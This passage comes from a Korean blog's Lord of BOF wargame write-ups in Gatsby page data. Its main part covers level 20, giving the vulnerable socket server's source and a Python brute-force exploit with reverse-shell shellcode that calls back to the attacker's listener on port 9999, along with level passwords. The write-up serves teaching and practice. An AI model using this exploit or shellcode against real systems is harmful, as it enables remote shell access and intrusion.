url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAtUlEQVR42nWPSw7DIAxEkUiA8C+QFBpKyv0POVVIu2sXTx7JHntMtNaw1sA6C2MMlmWBUmpUY/TQJ1JJSLlACA4pJU7fOXP5LZxzUFqBlFKw14reO7ZtQ60V7WgojweO14F7viOXjNYacs5De+/BGMM0TQMuOIQQ4JyD9P7Csz2xritCCLiFgLQmxBiRUhrmmOLVj+GTTIAQ8pt93+G9G299L57QmV4pKMU8zwNK6UjBOPu78A3brlt/YUAAqwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7242f49ca8af419e2cf8861fbd21b524/c9b55/14.webp 165w,\n/static/7242f49ca8af419e2cf8861fbd21b524/f2908/14.webp 330w,\n/static/7242f49ca8af419e2cf8861fbd21b524/ff4b8/14.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7242f49ca8af419e2cf8861fbd21b524/04c57/14.png 165w,\n/static/7242f49ca8af419e2cf8861fbd21b524/d9ecf/14.png 330w,\n/static/7242f49ca8af419e2cf8861fbd21b524/32056/14.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7242f49ca8af419e2cf8861fbd21b524/32056/14.png\"\n            alt=\"exploit2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>잘 적용되는 것을 확인할 수 있다. 현재의 위치에서 원본 실행파일 nightmare에 공격을 하기 위해 심볼릭 링크를 생성한 후 그대로 공격을 시도하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAA50lEQVR42pVRyU7FMAxM13TJ0ua1eW2cFAQX+P8PHGTzkEBw4TAa2c6MrYkiSijPTyivL0jXhRACjuOOdV3Ra42maWCdxTzPGMcRzjsMwwCl1C9I/x4j9kyg9zeE84RzDmtYYYwR5lqMHsx9Y40sYAOGdU7qfd+hzpSQiZApYbvdQJlQSgHlLBxjBBGhXAX8lkVs+v2yqqqEp2mCyiWLyHuPZVlkk7VWRO6xmWvp8WVmhtZaxJ8YZdZ1ncSljvPAtm3gLNmwrmvJjblt2x81MwuZefbFfd/LhWysUkpi6Lz/M+j/gD/lA+VNh/KLQFjwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1ca5fe79c0388d8e3dcb0bc879148c3b/c9b55/15.webp 165w,\n/static/1ca5fe79c0388d8e3dcb0bc879148c3b/f2908/15.webp 330w,\n/static/1ca5fe79c0388d8e3dcb0bc879148c3b/ff4b8/15.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1ca5fe79c0388d8e3dcb0bc879148c3b/04c57/15.png 165w,\n/static/1ca5fe79c0388d8e3dcb0bc879148c3b/d9ecf/15.png 330w,\n/static/1ca5fe79c0388d8e3dcb0bc879148c3b/32056/15.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1ca5fe79c0388d8e3dcb0bc879148c3b/32056/15.png\"\n            alt=\"exploit3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: beg for me</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"9dda2e16-8e98-58bb-904c-2bfed0ac89e3","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-18/","title":"LOB 18번 (succubus -> nightmare)","readingTime":{"text":"5 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/4913b/0.png","srcSet":"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/57642/0.png 105w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/bd384/0.png 211w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/4913b/0.png 421w","sizes":"(min-width: 421px) 421px, 100vw"},"sources":[{"srcSet":"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/1f505/0.webp 105w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/b1747/0.webp 211w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/afe20/0.webp 421w","type":"image/webp","sizes":"(min-width: 421px) 421px, 100vw"}]},"width":660,"height":399.76247030878864}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - dark knight\r\n        - remote BOF\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;netinet/in.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/socket.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/wait.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dumpcode.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">int</span> server_fd<span class=\"token punctuation\">,</span> client_fd<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> server_addr<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> client_addr<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> sin_size<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>server_fd <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span> SOCK_STREAM<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        server_addr<span class=\"token punctuation\">.</span>sin_family <span class=\"token operator\">=</span> AF_INET<span class=\"token punctuation\">;</span>\r\n        server_addr<span class=\"token punctuation\">.</span>sin_port <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span><span class=\"token number\">6666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        server_addr<span class=\"token punctuation\">.</span>sin_addr<span class=\"token punctuation\">.</span>s_addr <span class=\"token operator\">=</span> INADDR_ANY<span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">bzero</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>server_addr<span class=\"token punctuation\">.</span>sin_zero<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>server_addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n                sin_size <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>client_fd <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>client_addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sin_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"accept\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token punctuation\">}</span>\r\n\r\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Death Knight : Not even death can save you from me!\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"You : \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">256</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token punctuation\">}</span>\r\n\r\n                <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">waitpid</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>WNOHANG<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>평범한 소켓 통신 서버 역할을 하는 프로그램이며, 원격접속한 사용자로부터 입력값을 받고 있다. 그리고 이를 통해 Buffer Overflow(이하 BOF)가 발생하게 된다. 그리고 이전의 문제들과 다르게 이 버퍼에는 아무런 보호조치가 되어있지 않다. 결국 이 문제는 원격지에서 이 LOB 서버로 접속한 후, 쉘코드와 함께 bof를 발생시키면 된다. 우선 따로 만든 공격지에서 LOB 서버 6666번 포트로 nc 명령어를 사용하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 421px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAg0lEQVR42p2NSRKEIBAE8aDSQONJGjcc///InBj8wRzyUBUVWe55PrR2cd+NYoWcM2bGWlZKKdRtY9t3au8KxYyrNWIMjNOEiOC97wzDgMtZSUk5zoOkCeccEgLTNBJiZJ5nkuqbQ0DE40W6KMTQt5oVVX2FtVasGud5sCxLf/pJ/+ULPSdDymjjM9cAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/c9b55/0.webp 165w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/f2908/0.webp 330w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/ced8d/0.webp 421w\"\n              sizes=\"(max-width: 421px) 100vw, 421px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/04c57/0.png 165w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/d9ecf/0.png 330w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/092ed/0.png 421w\"\n            sizes=\"(max-width: 421px) 100vw, 421px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/092ed/0.png\"\n            alt=\"nc\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위와 같이 입력값을 받고 있다.\r\n공격지인 다른 리눅스 로컬로 리버스 쉘코드를 사용한 브루트 포스 코드를 작성해 두었다. 원격에서 공격하는 만큼 ret주소를 알 수 없기 때문에 브루트 포스를 사용했다.</p>\n<p><a href=\"https://orang.tistory.com/entry/%ED%95%B4%EC%BB%A4%EC%8A%A4%EC%BF%A8-LOB-xavius-deathknight-by-ORANG\">Reverse shellcode 출처</a></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">import sys<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">,</span> socket\r\n\r\nhost <span class=\"token operator\">=</span> <span class=\"token string\">\"192.168.235.135\"</span>\r\nport <span class=\"token operator\">=</span> <span class=\"token number\">6666</span>\r\n\r\nhexhost <span class=\"token operator\">=</span> <span class=\"token string\">\"\\xc0\\xa8\\xeb\\x8a\"</span> # <span class=\"token number\">192.168</span><span class=\"token number\">.235</span><span class=\"token number\">.138</span>\r\nrecvhexport <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x27\\x0f\"</span> # port <span class=\"token number\">9999</span>\r\n\r\nshellcode <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\"</span> <span class=\"token operator\">+</span> hexhost <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x68\\x02\\x00\"</span> <span class=\"token operator\">+</span> recvhexport <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span><span class=\"token number\">10</span> \r\npadding1 <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">44</span>\r\npadding2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x90\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span>\r\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\r\n\r\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\r\n\t<span class=\"token keyword\">for</span> j in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\r\n\t\t<span class=\"token keyword\">for</span> k in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\r\n\t\t \tr <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span><span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\r\n\t\t \tr<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \tretaddr <span class=\"token operator\">=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\xbf\"</span>\r\n\t\t \t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"RET: \"</span> <span class=\"token operator\">+</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span><span class=\"token punctuation\">.</span><span class=\"token function\">unpack</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I\"</span><span class=\"token punctuation\">,</span> retaddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \tpayload <span class=\"token operator\">+=</span> padding1\r\n\t\t \tpayload <span class=\"token operator\">+=</span> retaddr\r\n\t\t \tpayload <span class=\"token operator\">+=</span> padding2\r\n\t\t \tpayload <span class=\"token operator\">+=</span> shellcode\r\n\t\t \t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">52</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \tr<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\r\n\t\t \tr<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>LOB 서버에 6666번 포트로 연결하고, receive를 9999번 포트로 받으려고 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 363px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAf0lEQVR42p2NwQqDMBQEE2wE9ZkoJM8krVL9/3+cYqCn3noYdlhY1hzHznmd7PuLWgvrurIsgZgS4zCQVEka0ay8r5O+d1hrG8YYuq5r/nAO5xwmxdjGuWR88ITgkVmai3xzYhIh1yfbpnjvGccBmWdy1uZRE6WW+8TwL9b+9h/esUM2Lp/6BwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b754a2d60308b14589a7e62b310190cb/c9b55/1.webp 165w,\n/static/b754a2d60308b14589a7e62b310190cb/f2908/1.webp 330w,\n/static/b754a2d60308b14589a7e62b310190cb/2ed29/1.webp 363w\"\n              sizes=\"(max-width: 363px) 100vw, 363px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b754a2d60308b14589a7e62b310190cb/04c57/1.png 165w,\n/static/b754a2d60308b14589a7e62b310190cb/d9ecf/1.png 330w,\n/static/b754a2d60308b14589a7e62b310190cb/4e786/1.png 363w\"\n            sizes=\"(max-width: 363px) 100vw, 363px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b754a2d60308b14589a7e62b310190cb/4e786/1.png\"\n            alt=\"nc2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>nc로 공격지에서 listen 모드로 9999번 포트를 열어두고, 위의 브루트포스 코드를 실행시킨다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAApklEQVR42mWOyQ7DIBBDIawDAYlmoY1I+/9f6ZbJcunhycYYC/H+fNBaQ60rSimYpgnzPGPbNqSUkHPivDwKrLVQSrF2jDFwzt2Z1gpiWZa74JzlwuEdvPfw/lB3ah8JIYCIuEOBoLUGkYe1BqI+X/yLPka9GAjOWhAFfhhiZB3HyAPxPHe6jzFASgEhTtq+Y60rcs4YhgFSSubyXS/4bpB/+T324wt7MFfaxfoQUgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6f153b8d5d1f2065a95ce296083e8169/c9b55/2.webp 165w,\n/static/6f153b8d5d1f2065a95ce296083e8169/f2908/2.webp 330w,\n/static/6f153b8d5d1f2065a95ce296083e8169/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6f153b8d5d1f2065a95ce296083e8169/04c57/2.png 165w,\n/static/6f153b8d5d1f2065a95ce296083e8169/d9ecf/2.png 330w,\n/static/6f153b8d5d1f2065a95ce296083e8169/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6f153b8d5d1f2065a95ce296083e8169/32056/2.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: got the life</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"c84843b8-2360-52bd-a25a-b401ce0a9cff","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-20/","title":"LOB 20번 (xavius -> death_night)","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/d982fab324c57e4ed3f0343906b044d6/cf8b8/0.png","srcSet":"/static/d982fab324c57e4ed3f0343906b044d6/a1dc6/0.png 126w,\n/static/d982fab324c57e4ed3f0343906b044d6/dc89d/0.png 252w,\n/static/d982fab324c57e4ed3f0343906b044d6/cf8b8/0.png 504w","sizes":"(min-width: 504px) 504px, 100vw"},"sources":[{"srcSet":"/static/d982fab324c57e4ed3f0343906b044d6/0e223/0.webp 126w,\n/static/d982fab324c57e4ed3f0343906b044d6/2a896/0.webp 252w,\n/static/d982fab324c57e4ed3f0343906b044d6/8ac24/0.webp 504w","type":"image/webp","sizes":"(min-width: 504px) 504px, 100vw"}]},"width":660,"height":399.40476190476187}}}},"body":"<p>비주얼베이직에서 스트링 비교함수 이름은?</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 504px; \"\n    >\n      <span\n    